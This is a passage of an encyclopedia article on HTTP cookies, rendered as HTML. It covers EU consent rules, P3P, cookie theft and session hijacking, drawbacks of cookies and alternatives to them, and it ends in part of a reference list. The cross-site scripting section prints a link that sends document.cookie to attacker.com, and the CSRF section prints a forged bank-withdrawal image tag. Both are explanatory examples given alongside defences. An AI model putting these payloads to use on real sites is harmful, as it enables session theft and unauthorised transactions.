+<p>Directive 95/46/EC defines ‘the data subject’s consent’ as: “any freely given specific and informed indication of his wishes by which the data subject signifies his agreement to personal data relating to him being processed”.<sup id="cite_ref-42" class="reference"><a href="#cite_note-42"><span>[</span>42<span>]</span></a></sup> Consent must involve some form of communication where individuals knowingly indicate their acceptance.<sup id="cite_ref-ICO_reference_41-1" class="reference"><a href="#cite_note-ICO_reference-41"><span>[</span>41<span>]</span></a></sup></p>
+<p>In 2009, the policy was amended by Directive 2009/136/EC, which included a change to Article 5 Paragraph 3. Instead of having an option for users to opt out of cookie storage, the revised Directive requires consent to be obtained for cookie storage.<sup id="cite_ref-ICO_reference_41-2" class="reference"><a href="#cite_note-ICO_reference-41"><span>[</span>41<span>]</span></a></sup></p>
+<p>In June 2012, European data protection authorities adopted an opinion which clarifies that some cookie users might be exempt from the requirement to gain consent:</p>
+<ul>
+<li>Some cookies can be exempted from informed consent under certain conditions if they are not used for additional purposes. These cookies include cookies used to keep track of a user’s input when filling online forms or as a shopping cart.</li>
+<li>First party analytics cookies are not likely to create a privacy risk if websites provide clear information about the cookies to users and privacy safeguards.<sup id="cite_ref-43" class="reference"><a href="#cite_note-43"><span>[</span>43<span>]</span></a></sup></li>
+</ul>
+<p>The industry’s response has been largely negative. Some viewed the Directive as an infernal doomsday machine that will "kill online sales" and "kill the internet". Robert Bond of the law firm Speechly Bircham describes the effects as "far-reaching and incredibly onerous" for "all UK companies." Simon Davis of Privacy International argues that proper enforcement would "destroy the entire industry."<sup id="cite_ref-44" class="reference"><a href="#cite_note-44"><span>[</span>44<span>]</span></a></sup></p>
+<p>The <a href="P3P" title="P3P">P3P</a> specification offers possibility for a server to state a privacy policy using an <a href="HTTP_header" title="HTTP header" class="mw-redirect">HTTP header</a>, which specifies which kind of information it collects and for which purpose. These policies include (but are not limited to) the use of information gathered using cookies. According to the P3P specification, a browser can accept or reject cookies by comparing the privacy policy with the stored user preferences or ask the user, presenting them the privacy policy as declared by the server. However, the P3P specification was criticized by web developers for its complexity, only <a href="Internet_Explorer" title="Internet Explorer">Internet Explorer</a> provides adequate support for the specification, and some websites used incorrect code in their headers (while <a href="Facebook" title="Facebook">Facebook</a>, for a period, jokingly used "HONK" as its P3P header).<sup id="cite_ref-nyt-bits_45-0" class="reference"><a href="#cite_note-nyt-bits-45"><span>[</span>45<span>]</span></a></sup></p>
+<p>Third-party cookies can be blocked by most browsers to increase privacy and reduce tracking by advertising and tracking companies without negatively affecting the user's Web experience. Many advertising operators have an opt-out option to behavioural advertising, with a generic cookie in the browser stopping behavioural advertising.<sup id="cite_ref-howtoblock_46-0" class="reference"><a href="#cite_note-howtoblock-46"><span>[</span>46<span>]</span></a></sup><sup id="cite_ref-nyt-bits_45-1" class="reference"><a href="#cite_note-nyt-bits-45"><span>[</span>45<span>]</span></a></sup></p>
+<h2><span class="editsection">[<a href="../../w/index-title=HTTP_cookie&action=edit&section=23.php.html" title="Edit section: Cookie theft and session hijacking">edit</a>]</span> <span class="mw-headline" id="Cookie_theft_and_session_hijacking">Cookie theft and session hijacking</span></h2>
+<table class="metadata plainlinks ambox ambox-content ambox-multiple_issues compact-ambox" style="">
+<tr>
+<td class="mbox-image">
+<div style="width: 52px;"><img alt="" src="http://upload.wikimedia.org/wikipedia/en/f/f4/Ambox_content.png" width="40" height="40" /></div>
+</td>
+<td class="mbox-text" style=""><span class="mbox-text-span"><b>This section has multiple issues</b>. Please help <b><a class="external text" href="../../w/index-title=HTTP_cookie&action=edit.php.html">improve it</a></b> or discuss these issues on the <b><a href="Talk_HTTP_cookie" title="Talk:HTTP cookie">talk page</a></b>.</span>
+<table class="metadata plainlinks ambox ambox-content ambox-Original_research" style="">
+<tr>
+<td class="mbox-image">
+<div style="width: 52px;"><img alt="" src="http://upload.wikimedia.org/wikipedia/en/f/f4/Ambox_content.png" width="40" height="40" /></div>
+</td>
+<td class="mbox-text" style=""><span class="mbox-text-span">This section <b>may contain <a href="Wikipedia_No_original_research" title="Wikipedia:No original research">original research</a></b>. <span class="hide-when-compact">Please <a class="external text" href="../../w/index-title=HTTP_cookie&action=edit.php.html">improve it</a> by <a href="Wikipedia_Verifiability" title="Wikipedia:Verifiability">verifying</a> the claims made and adding <a href="Wikipedia_References" title="Wikipedia:References" class="mw-redirect">references</a>. Statements consisting only of original research may be removed.</span> <small><i>(September 2011)</i></small> </span></td>
+</tr>
+</table>
+<table class="metadata plainlinks ambox ambox-content ambox-Unreferenced" style="">
+<tr>
+<td class="mbox-image">
+<div style="width: 52px;"><a href="http://en.wikipedia.org/wiki/File:Question_book-new.svg" class="image"><img alt="Question book-new.svg" src="http://upload.wikimedia.org/wikipedia/en/thumb/9/99/Question_book-new.svg/50px-Question_book-new.svg.png" width="50" height="39" srcset="//upload.wikimedia.org/wikipedia/en/thumb/9/99/Question_book-new.svg/75px-Question_book-new.svg.png 1.5x, //upload.wikimedia.org/wikipedia/en/thumb/9/99/Question_book-new.svg/100px-Question_book-new.svg.png 2x" /></a></div>
+</td>
+<td class="mbox-text" style=""><span class="mbox-text-span">This section <b>does not <a href="Wikipedia_Citing_sources" title="Wikipedia:Citing sources">cite</a> any <a href="Wikipedia_Verifiability" title="Wikipedia:Verifiability">references or sources</a></b>. <span class="hide-when-compact">Please help improve this section by <a href="Help_Introduction_to_referencing/1" title="Help:Introduction to referencing/1">adding citations to reliable sources</a>. Unsourced material may be challenged and <a href="Wikipedia_Verifiability#Burden_of_evidence" title="Wikipedia:Verifiability">removed</a>.</span> <small><i>(September 2011)</i></small> </span></td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+<p>Most websites use cookies as the only identifiers for user sessions, because other methods of identifying web users have limitations and vulnerabilities. If a website uses cookies as session identifiers, attackers can impersonate users’ requests by stealing a full set of victims’ cookies. From the web server's point of view, a request from an attacker has the same authentication as the victim’s requests; thus the request is performed on behalf of the victim’s session.</p>
+<p>Listed here are various scenarios of cookie theft and user session hijacking (even without stealing user cookies) which work with websites which rely solely on HTTP cookies for user identification.</p>
+<h3><span class="editsection">[<a href="../../w/index-title=HTTP_cookie&action=edit&section=24.php.html" title="Edit section: Network eavesdropping">edit</a>]</span> <span class="mw-headline" id="Network_eavesdropping">Network eavesdropping</span></h3>
+<div class="thumb tright">
+<div class="thumbinner" style="width:222px;"><a href="http://en.wikipedia.org/wiki/File:Cookie-sniffing.svg" class="image"><img alt="" src="http://upload.wikimedia.org/wikipedia/commons/thumb/e/e5/Cookie-sniffing.svg/220px-Cookie-sniffing.svg.png" width="220" height="110" class="thumbimage" srcset="//upload.wikimedia.org/wikipedia/commons/thumb/e/e5/Cookie-sniffing.svg/330px-Cookie-sniffing.svg.png 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/e/e5/Cookie-sniffing.svg/440px-Cookie-sniffing.svg.png 2x" /></a>
+<div class="thumbcaption">
+<div class="magnify"><a href="http://en.wikipedia.org/wiki/File:Cookie-sniffing.svg" class="internal" title="Enlarge"><img src="http://bits.wikimedia.org/static-1.21wmf9/skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div>
+A cookie can be stolen by another computer that is allowed reading from the network</div>
+</div>
+</div>
+<p>Traffic on a network can be intercepted and read by computers on the network other than the sender and receiver (particularly over <a href="Plaintext" title="Plaintext">unencrypted</a> open <a href="Wi-Fi" title="Wi-Fi">Wi-Fi</a>). This traffic includes cookies sent on ordinary unencrypted <a href="HTTP" title="HTTP" class="mw-redirect">HTTP</a> sessions. Where network traffic is not encrypted, attackers can therefore read the communications of other users on the network, including HTTP cookies as well as the entire contents of the conversations, for the purpose of a <a href="Man-in-the-middle_attack" title="Man-in-the-middle attack">man-in-the-middle attack</a>.</p>
+<p>An attacker could use intercepted cookies to impersonate a user and perform a malicious task, such as transferring money out of the victim’s bank account.</p>
+<p>This issue can be resolved by securing the communication between the user's computer and the server by employing <a href="Transport_Layer_Security" title="Transport Layer Security">Transport Layer Security</a> (<a href="HTTPS" title="HTTPS" class="mw-redirect">HTTPS</a> protocol) to encrypt the connection. A server can specify the <i>Secure</i> flag while setting a cookie, which will cause the browser to send the cookie only over an encrypted channel, such as an SSL connection.<sup id="cite_ref-httponlyrfc_17-2" class="reference"><a href="#cite_note-httponlyrfc-17"><span>[</span>17<span>]</span></a></sup></p>
+<h3><span class="editsection">[<a href="../../w/index-title=HTTP_cookie&action=edit&section=25.php.html" title="Edit section: Publishing false sub-domain – DNS cache poisoning">edit</a>]</span> <span class="mw-headline" id="Publishing_false_sub-domain_.E2.80.93_DNS_cache_poisoning">Publishing false sub-domain – DNS cache poisoning</span></h3>
+<p>Via <a href="DNS_cache_poisoning" title="DNS cache poisoning" class="mw-redirect">DNS cache poisoning</a>, an attacker might be able to cause a DNS server to cache a fabricated DNS entry, say <code>f12345.www.example.com</code> with the attacker’s server IP address. The attacker can then post an image URL from his own server (for example, <code>http://f12345.www.example.com/img_4_cookie.jpg</code>). Victims reading the attacker’s message would download this image from <code>f12345.www.example.com</code>. Since <code>f12345.www.example.com</code> is a sub-domain of <code>www.example.com</code>, victims’ browsers would submit all <code>example.com</code>-related cookies to the attacker’s server; the compromised cookies would also include <i>HttpOnly</i> cookies.<sup class="noprint Inline-Template" style="white-space:nowrap;">[<i><a href="Wikipedia_Please_clarify" title="Wikipedia:Please clarify"><span title="The text in the vicinity of this tag needs clarification or removal of jargon from August 2011">clarification needed</span></a></i>]</sup></p>
+<p>This vulnerability is usually for <a href="Internet_Service_Provider" title="Internet Service Provider" class="mw-redirect">Internet Service Providers</a> to fix, by securing their DNS servers. But it can also be mitigated if <code>www.example.com</code> is using <i>Secure</i> cookies. Victims’ browsers will not submit <i>Secure</i> cookies if the attacker’s image is not using encrypted connections. If the attacker chose to use <a href="HTTPS" title="HTTPS" class="mw-redirect">HTTPS</a> for his img_4_cookie.jpg download, he would have the challenge<sup id="cite_ref-certificatehack_47-0" class="reference"><a href="#cite_note-certificatehack-47"><span>[</span>47<span>]</span></a></sup> of obtaining an SSL certificate for <code>f12345.www.example.com</code> from a <a href="Certificate_Authority" title="Certificate Authority" class="mw-redirect">Certificate Authority</a>. Without a proper SSL certificate, victims’ browsers would display (usually very visible) warning messages about the invalid certificate, thus alerting victims as well as security officials from <code>www.example.com</code> (the latter would require someone to inform the security officials).</p>
+<h3><span class="editsection">[<a href="../../w/index-title=HTTP_cookie&action=edit&section=26.php.html" title="Edit section: Cross-site scripting – cookie theft">edit</a>]</span> <span class="mw-headline" id="Cross-site_scripting_.E2.80.93_cookie_theft">Cross-site scripting – cookie theft</span></h3>
+<div class="rellink relarticle mainarticle">Main article: <a href="Cross-site_scripting" title="Cross-site scripting">Cross-site scripting</a></div>
+<p>Scripting languages such as <a href="JavaScript" title="JavaScript">JavaScript</a> are usually allowed to access cookie values and have some means to send arbitrary values to arbitrary servers on the Internet. These facts are used in combination with sites allowing users to post HTML content that other users can see.</p>
+<p>As an example, an attacker may post a message on <code>www.example.com</code> with the following link:</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr">
+<div class="html5 source-html5">
+<pre class="de1">
+<span class="sc2">&lt;<span class="kw2">a</span> <span class="kw3">href</span><span class="sy0">=</span><span class="st0">"#"</span> <span class="kw3">onclick</span><span class="sy0">=</span><span class="st0">"window.location='http://attacker.com/stole.cgi?text='+escape(document.cookie); return false;"</span>&gt;</span>Click here!<span class="sc2">&lt;<span class="sy0">/</span><span class="kw2">a</span>&gt;</span>
+</pre></div>
+</div>
+<div class="thumb tright">
+<div class="thumbinner" style="width:222px;"><a href="http://en.wikipedia.org/wiki/File:Cookie-theft.svg" class="image"><img alt="" src="http://upload.wikimedia.org/wikipedia/commons/thumb/7/7a/Cookie-theft.svg/220px-Cookie-theft.svg.png" width="220" height="110" class="thumbimage" srcset="//upload.wikimedia.org/wikipedia/commons/thumb/7/7a/Cookie-theft.svg/330px-Cookie-theft.svg.png 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/7/7a/Cookie-theft.svg/440px-Cookie-theft.svg.png 2x" /></a>
+<div class="thumbcaption">
+<div class="magnify"><a href="http://en.wikipedia.org/wiki/File:Cookie-theft.svg" class="internal" title="Enlarge"><img src="http://bits.wikimedia.org/static-1.21wmf9/skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div>
+Cross-site scripting: a cookie that should be only exchanged between a server and a client is sent to another party.</div>
+</div>
+</div>
+<p>When another user clicks on this link, the browser executes the piece of code within the <code>onclick</code> attribute, thus replacing the string <code>document.cookie</code> with the list of cookies of the user that are active for the page. As a result, this list of cookies is sent to the <code>attacker.com</code> server. If the attacker’s posting is on <code>https://www.example.com/somewhere</code>, secure cookies will also be sent to attacker.com in plain text.</p>
+<p>Cross-site scripting is a constant threat, as there are always some crackers trying to find a way of slipping in script tags to websites. It is the responsibility of the website developers to filter out such malicious code.</p>
+<p>In the meantime, such attacks can be mitigated by using <i>HttpOnly</i> cookies. These cookies will not be accessible by client side script, and therefore, the attacker will not be able to gather these cookies.</p>
+<h3><span class="editsection">[<a href="../../w/index-title=HTTP_cookie&action=edit&section=27.php.html" title="Edit section: Cross-site scripting">edit</a>]</span> <span class="mw-headline" id="Cross-site_scripting">Cross-site scripting</span></h3>
+<p>If an attacker was able to insert a piece of script to a page on <code>www.example.com</code>, and a victim’s browser was able to execute the script, the script could simply carry out the attack. This attack would use the victim’s browser to send HTTP requests to servers directly; therefore, the victim’s browser would submit all relevant cookies, including <i>HttpOnly</i> cookies, as well as <i>Secure</i> cookies if the script request is on <a href="HTTPS" title="HTTPS" class="mw-redirect">HTTPS</a>.</p>
+<p>For example, on MySpace, Samy posted a short message “Samy is my hero” on his profile, with a hidden script to send Samy a “friend request” and then post the same message on the victim’s profile. A user reading Samy’s profile would send Samy a “friend request” and post the same message on this person’s profile. Then, the third person reading the second person’s profile would do the same. Pretty soon, this <a href="Samy_worm" title="Samy worm" class="mw-redirect">Samy worm</a> became one of the fastest spreading worms of all time.</p>
+<p>This type of attack (with automated scripts) would not work if a website had <a href="CAPTCHA" title="CAPTCHA">CAPTCHA</a> to challenge client requests.</p>
+<h3><span class="editsection">[<a href="../../w/index-title=HTTP_cookie&action=edit&section=28.php.html" title="Edit section: Cross-site scripting – proxy request">edit</a>]</span> <span class="mw-headline" id="Cross-site_scripting_.E2.80.93_proxy_request">Cross-site scripting – proxy request</span></h3>
+<p>In older versions of browsers, there were security holes allowing attackers to script a proxy request by using <a href="XMLHttpRequest" title="XMLHttpRequest">XMLHttpRequest</a>. For example, a victim is reading an attacker’s posting on <code>www.example.com</code>, and the attacker’s script is executed in the victim’s browser. The script generates a request to <code>www.example.com</code> with the proxy server <code>attacker.com</code>. Since the request is for <code>www.example.com</code>, all <code>example.com</code> cookies will be sent along with the request, but routed through the attacker’s proxy server, hence, the attacker can harvest the victim’s cookies.</p>
+<p>This attack would not work for <i>Secure</i> cookie, since <i>Secure</i> cookies go with <a href="HTTPS" title="HTTPS" class="mw-redirect">HTTPS</a> connections, and its protocol dictates end-to-end encryption, i.e., the information is encrypted on the user’s browser and decrypted on the destination server <code>www.example.com</code>, so the proxy servers would only see encrypted bits and bytes.</p>
+<h3><span class="editsection">[<a href="../../w/index-title=HTTP_cookie&action=edit&section=29.php.html" title="Edit section: Cross-site request forgery">edit</a>]</span> <span class="mw-headline" id="Cross-site_request_forgery">Cross-site request forgery</span></h3>
+<div class="rellink relarticle mainarticle">Main article: <a href="Cross-site_request_forgery" title="Cross-site request forgery">Cross-site request forgery</a></div>
+<p>For example, Bob might be browsing a chat forum where another user, Mallory, has posted a message. Suppose that Mallory has crafted an HTML image element that references an action on Bob's bank's website (rather than an image file), e.g.,</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr">
+<div class="xml source-xml">
+<pre class="de1">
+<span class="sc3"><span class="re1">&lt;img</span> <span class="re0">src</span>=<span class="st0">"http://bank.example.com/withdraw?account=bob&amp;amount=1000000&amp;for=mallory"</span><span class="re2">&gt;</span></span>
+</pre></div>
+</div>
+<p>If Bob's bank keeps his authentication information in a cookie, and if the cookie hasn't expired, then the attempt by Bob's browser to load the image will submit the withdrawal form with his cookie, thus authorizing a transaction without Bob's approval.</p>
+<h2><span class="editsection">[<a href="../../w/index-title=HTTP_cookie&action=edit&section=30.php.html" title="Edit section: Drawbacks of cookies">edit</a>]</span> <span class="mw-headline" id="Drawbacks_of_cookies">Drawbacks of cookies</span></h2>
+<p>Besides privacy concerns, cookies also have some technical drawbacks. In particular, they do not always accurately identify users, they can be used for security attacks, and they are often at odds with the Representational State Transfer (<a href="Representational_State_Transfer" title="Representational State Transfer" class="mw-redirect">REST</a>) software architectural style.<sup id="cite_ref-48" class="reference"><a href="#cite_note-48"><span>[</span>48<span>]</span></a></sup><sup id="cite_ref-49" class="reference"><a href="#cite_note-49"><span>[</span>49<span>]</span></a></sup></p>
+<h3><span class="editsection">[<a href="../../w/index-title=HTTP_cookie&action=edit&section=31.php.html" title="Edit section: Inaccurate identification">edit</a>]</span> <span class="mw-headline" id="Inaccurate_identification">Inaccurate identification</span></h3>
+<p>If more than one browser is used on a computer, each usually has a separate storage area for cookies. Hence cookies do not identify a person, but a combination of a user account, a computer, and a Web browser. Thus, anyone who uses multiple accounts, computers, or browsers has multiple sets of cookies.</p>
+<p>Likewise, cookies do not differentiate between multiple users who share the same <a href="User_account" title="User account" class="mw-redirect">user account</a>, computer, and browser.</p>
+<h3><span class="editsection">[<a href="../../w/index-title=HTTP_cookie&action=edit&section=32.php.html" title="Edit section: Inconsistent state on client and server">edit</a>]</span> <span class="mw-headline" id="Inconsistent_state_on_client_and_server">Inconsistent state on client and server</span></h3>
+<p>The use of cookies may generate an inconsistency between the state of the client and the state as stored in the cookie. If the user acquires a cookie and then clicks the "Back" button of the browser, the state on the browser is generally not the same as before that acquisition. As an example, if the shopping cart of an online shop is built using cookies, the content of the cart may not change when the user goes back in the browser's history: if the user presses a button to add an item in the shopping cart and then clicks on the "Back" button, the item remains in the shopping cart. This might not be the intention of the user, who possibly wanted to undo the addition of the item. This can lead to unreliability, confusion, and bugs. Web developers should therefore be aware of this issue and implement measures to handle such situations.</p>
+<h3><span class="editsection">[<a href="../../w/index-title=HTTP_cookie&action=edit&section=33.php.html" title="Edit section: Inconsistent support by devices">edit</a>]</span> <span class="mw-headline" id="Inconsistent_support_by_devices">Inconsistent support by devices</span></h3>
+<p>The problem with using mobile cookies is that most devices do not implement cookies; for example, <a href="Nokia" title="Nokia">Nokia</a> only supports cookies on 60% of its devices, while <a href="Motorola" title="Motorola">Motorola</a> only supports cookies on 45% of its phones.<sup id="cite_ref-Mena2011_50-0" class="reference"><a href="#cite_note-Mena2011-50"><span>[</span>50<span>]</span></a></sup> In addition, some gateways and networks (<a href="Verizon" title="Verizon" class="mw-redirect">Verizon</a>, <a href="Alltel" title="Alltel">Alltel</a>, and <a href="MetroPCS" title="MetroPCS">MetroPCS</a>) strip cookies, while other networks simulate cookies on behalf of their mobile devices. There are also dramatic variations in the wireless markets around the world; for example, in the United Kingdom 94% of the devices support wireless cookies, while in the United States only 47% support them.</p>
+<p>The support for cookies is greater in the <a href="Far_East" title="Far East">Far East</a>, where wireless devices are more commonly used to access the web. Mobile cookies is a practice already in place in <a href="Japan" title="Japan">Japan</a>, so that whether watching a podcast, a video, TV, clicking on a loan calculator or a GPS map—on almost all wireless devices—cookies can be set for tracking and capturing wireless behaviors.<sup id="cite_ref-Mena2011_50-1" class="reference"><a href="#cite_note-Mena2011-50"><span>[</span>50<span>]</span></a></sup></p>
+<h2><span class="editsection">[<a href="../../w/index-title=HTTP_cookie&action=edit&section=34.php.html" title="Edit section: Alternatives to cookies">edit</a>]</span> <span class="mw-headline" id="Alternatives_to_cookies">Alternatives to cookies</span></h2>
+<p>Some of the operations that can be done using cookies can also be done using other mechanisms.</p>
+<h3><span class="editsection">[<a href="../../w/index-title=HTTP_cookie&action=edit&section=35.php.html" title="Edit section: IP address">edit</a>]</span> <span class="mw-headline" id="IP_address">IP address</span></h3>
+<p>Some users may be tracked based on the <a href="IP_address" title="IP address">IP address</a> of the computer requesting the page. The server knows the IP address of the computer running the browser or the <a href="Proxy_server" title="Proxy server">proxy</a>, if any is used, and could theoretically link a user's session to this IP address.</p>
+<p>IP addresses are, generally, not a reliable way to track a session or identify a user. Many computers designed to be used by a single user, such as office PCs or home PCs, are behind a network address translator (NAT). This means that several PCs will share a public IP address. Furthermore, some systems, such as <a href="Tor_(anonymity_network)" title="Tor (anonymity network)">Tor</a>, are designed to retain <a href="Internet_anonymity" title="Internet anonymity" class="mw-redirect">Internet anonymity</a>, rendering tracking by IP address impractical, impossible, or a security risk.</p>
+<h3><span class="editsection">[<a href="../../w/index-title=HTTP_cookie&action=edit&section=36.php.html" title="Edit section: URL (query string)">edit</a>]</span> <span class="mw-headline" id="URL_.28query_string.29">URL (query string)</span></h3>
+<p>A more precise technique is based on embedding information into URLs. The <a href="Query_string" title="Query string">query string</a> part of the <a href="Uniform_Resource_Locator" title="Uniform Resource Locator" class="mw-redirect">URL</a> is the one that is typically used for this purpose, but other parts can be used as well. The <a href="Java_Servlet" title="Java Servlet">Java Servlet</a> and <a href="PHP" title="PHP">PHP</a> session mechanisms both use this method if cookies are not enabled.</p>
+<p>This method consists of the Web server appending query strings to the links of a Web page it holds when sending it to a browser. When the user follows a link, the browser returns the attached query string to the server.</p>
+<p>Query strings used in this way and cookies are very similar, both being arbitrary pieces of information chosen by the server and sent back by the browser. However, there are some differences: since a query string is part of a URL, if that URL is later reused, the same attached piece of information is sent to the server. For example, if the preferences of a user are encoded in the query string of a URL and the user sends this URL to another user by <a href="E-mail" title="E-mail" class="mw-redirect">e-mail</a>, those preferences will be used for that other user as well.</p>
+<p>Moreover, even if the same user accesses the same page two times, there is no guarantee that the same query string is used in both views. For example, if the same user arrives to the same page but coming from a page internal to the site the first time and from an external <a href="Search_engine" title="Search engine" class="mw-redirect">search engine</a> the second time, the relative query strings are typically different while the cookies would be the same. For more details, see <a href="Query_string" title="Query string">query string</a>.</p>
+<p>Other drawbacks of query strings are related to security: storing data that identifies a session in a query string enables or simplifies <a href="Session_fixation" title="Session fixation">session fixation</a> attacks, <a href="HTTP_referrer" title="HTTP referrer" class="mw-redirect">referrer</a> logging attacks and other <a href="Exploit_(computer_security)" title="Exploit (computer security)">security exploits</a>. Transferring session identifiers as HTTP cookies is more secure.</p>
+<h3><span class="editsection">[<a href="../../w/index-title=HTTP_cookie&action=edit&section=37.php.html" title="Edit section: Hidden form fields">edit</a>]</span> <span class="mw-headline" id="Hidden_form_fields">Hidden form fields</span></h3>
+<p>Another form of session tracking is to use <a href="Form_(web)" title="Form (web)" class="mw-redirect">web forms</a> with hidden fields. This technique is very similar to using URL query strings to hold the information and has many of the same advantages and drawbacks; and if the form is handled with the <a href="HTTP" title="HTTP" class="mw-redirect">HTTP</a> GET method, the fields actually become part of the URL the browser will send upon form submission. But most forms are handled with HTTP POST, which causes the form information, including the hidden fields, to be appended as extra input that is neither part of the URL, nor of a cookie.</p>
+<p>This approach presents two advantages from the point of view of the tracker: first, having the tracking information placed in the HTML source and POST input rather than in the URL means it will not be noticed by the average user; second, the session information is not copied when the user copies the URL (to save the page on disk or send it via email, for example).</p>
+<p>This method can be easily used with any framework that supports web forms.</p>
+<h3><span class="editsection">[<a href="../../w/index-title=HTTP_cookie&action=edit&section=38.php.html" title="Edit section: window.name">edit</a>]</span> <span class="mw-headline" id="window.name">window.name</span></h3>
+<p>All current web browsers can store a fairly large amount of data (2–32 MB) via JavaScript using the <a href="Document_Object_Model" title="Document Object Model">DOM</a> property window.name. This data can be used instead of session cookies and is also cross-domain. The technique can be coupled with <a href="JSON" title="JSON">JSON</a>/JavaScript objects to store complex sets of session variables<sup id="cite_ref-51" class="reference"><a href="#cite_note-51"><span>[</span>51<span>]</span></a></sup> on the client side.</p>
+<p>The downside is that every separate window or <a href="Tabbed_document_interface" title="Tabbed document interface" class="mw-redirect">tab</a> will initially have an empty <i>window.name</i>; in times of <a href="Tabbed_document_interface" title="Tabbed document interface" class="mw-redirect">tabbed browsing</a> this means that individually opened tabs <i>(initiation by user)</i> will not have a window name. Furthermore <i>window.name</i> can be used for tracking visitors across different websites, making it of concern for <a href="Internet_privacy" title="Internet privacy">Internet privacy</a>.</p>
+<p>In some respects this can be more secure than cookies due to not involving the server, so it is not vulnerable to <i>network</i> cookie sniffing attacks. However if special measures are not taken to protect the data, it is vulnerable to other attacks because the data is available across different websites opened in the same window or tab.</p>
+<h3><span class="editsection">[<a href="../../w/index-title=HTTP_cookie&action=edit&section=39.php.html" title="Edit section: HTTP authentication">edit</a>]</span> <span class="mw-headline" id="HTTP_authentication">HTTP authentication</span></h3>
+<p>The HTTP protocol includes the <a href="Basic_access_authentication" title="Basic access authentication">basic access authentication</a> and the <a href="Digest_access_authentication" title="Digest access authentication">digest access authentication</a> protocols, which allow access to a Web page only when the user has provided the correct username and password. If the server requires such credentials for granting access to a web page, the browser requests them from the user and, once obtained, the browser stores and sends them in every subsequent page request. This information can be used to track the user.</p>
+<h2><span class="editsection">[<a href="../../w/index-title=HTTP_cookie&action=edit&section=40.php.html" title="Edit section: See also">edit</a>]</span> <span class="mw-headline" id="See_also">See also</span></h2>
+<ul>
+<li><a href="Dynamic_HTML" title="Dynamic HTML">Dynamic HTML</a></li>
+<li><a href="Evercookie" title="Evercookie">Evercookie</a></li>
+<li><a href="Local_Shared_Object" title="Local Shared Object" class="mw-redirect">Local Shared Object</a> – Flash Cookies</li>
+<li><a href="Session_Beans" title="Session Beans">Session Beans</a></li>
+<li><a href="Session_(computer_science)" title="Session (computer science)">Session (computer science)</a></li>
+<li><a href="Session_ID" title="Session ID">Session ID</a></li>
+<li><a href="Http_session" title="Http session" class="mw-redirect">Web server session management</a></li>
+<li><a href="Web_Storage" title="Web Storage" class="mw-redirect">Web Storage and DOM Storage</a></li>
+<li><a href="Web_visitor_tracking" title="Web visitor tracking" class="mw-redirect">Web visitor tracking</a></li>
+<li><a href="Zombie_cookie" title="Zombie cookie">Zombie cookie</a></li>
+</ul>
+<h2><span class="editsection">[<a href="../../w/index-title=HTTP_cookie&action=edit&section=41.php.html" title="Edit section: References">edit</a>]</span> <span class="mw-headline" id="References">References</span></h2>
+<div class="reflist references-column-count references-column-count-2" style="-moz-column-count: 2; -webkit-column-count: 2; column-count: 2; list-style-type: decimal;">
+<ol class="references">
+<li id="cite_note-1"><span class="mw-cite-backlink"><b><a href="#cite_ref-1">^</a></b></span> <span class="reference-text"><span class="citation web"><a rel="nofollow" class="external text" href="http://tools.ietf.org/html/rfc6265#section-3">"HTTP State Management Mechanism – Overview"</a>. <i>IETF</i>. April 2011<span class="printonly">. <a rel="nofollow" class="external free" href="http://tools.ietf.org/html/rfc6265#section-3">http://tools.ietf.org/html/rfc6265#section-3</a></span>.</span></span></li>
+<li id="cite_note-2"><span class="mw-cite-backlink"><b><a href="#cite_ref-2">^</a></b></span> <span class="reference-text">Penenberg, Adam; <a rel="nofollow" class="external text" href="http://www.slate.com/id/2129656/"><i>Cookie Monsters</i></a>, <a href="Slate_(magazine)" title="Slate (magazine)">Slate</a>, November 7, 2005. "Cookies are not software. They can't be programmed, can't carry viruses, and can't unleash malware to go wilding through your hard drive."</span></li>
+<li id="cite_note-eulaw-3"><span class="mw-cite-backlink"><b><a href="#cite_ref-eulaw_3-0">^</a></b></span> <span class="reference-text"><span class="citation news"><a rel="nofollow" class="external text" href="http://www.bbc.co.uk/news/technology-12668552">"New net rules set to make cookies crumble"</a>. <i>BBC</i>. 2011-03-08<span class="printonly">. <a rel="nofollow" class="external free" href="http://www.bbc.co.uk/news/technology-12668552">http://www.bbc.co.uk/news/technology-12668552</a></span>.</span></span></li>
+<li id="cite_note-4"><span class="mw-cite-backlink"><b><a href="#cite_ref-4">^</a></b></span> <span class="reference-text"><span class="citation web"><a rel="nofollow" class="external text" href="http://adage.com/article/digital/sen-rockefeller-ready-a-real-track-bill/227426/">"Sen. Rockefeller: Get Ready for a Real Do-Not-Track Bill for Online Advertising"</a>. <i>Adage.com</i>. 2011-05-06<span class="printonly">. <a rel="nofollow" class="external free" href="http://adage.com/article/digital/sen-rockefeller-ready-a-real-track-bill/227426/">http://adage.com/article/digital/sen-rockefeller-ready-a-real-track-bill/227426/</a></span>.</span></span></li>
+<li id="cite_note-5"><span class="mw-cite-backlink"><b><a href="#cite_ref-5">^</a></b></span> <span class="reference-text"><span class="citation web">Vamosi, Robert (2008-04-14). <a rel="nofollow" class="external text" href="http://news.cnet.com/8301-10789_3-9918582-57.html">"Gmail cookie stolen via Google Spreadsheets"</a><span class="printonly">. <a rel="nofollow" class="external free" href="http://news.cnet.com/8301-10789_3-9918582-57.html">http://news.cnet.com/8301-10789_3-9918582-57.html</a></span>.</span></span></li>
+<li id="cite_note-6"><span class="mw-cite-backlink"><b><a href="#cite_ref-6">^</a></b></span> <span class="reference-text"><span class="citation news">Schwartz, John (2001-09-04). <a rel="nofollow" class="external text" href="http://www.nytimes.com/2001/09/04/technology/04COOK.html">"Giving Web a Memory Cost Its Users Privacy"</a>. <i>The New York Times</i><span class="printonly">. <a rel="nofollow" class="external free" href="http://www.nytimes.com/2001/09/04/technology/04COOK.html">http://www.nytimes.com/2001/09/04/technology/04COOK.html</a></span>.</span></span></li>
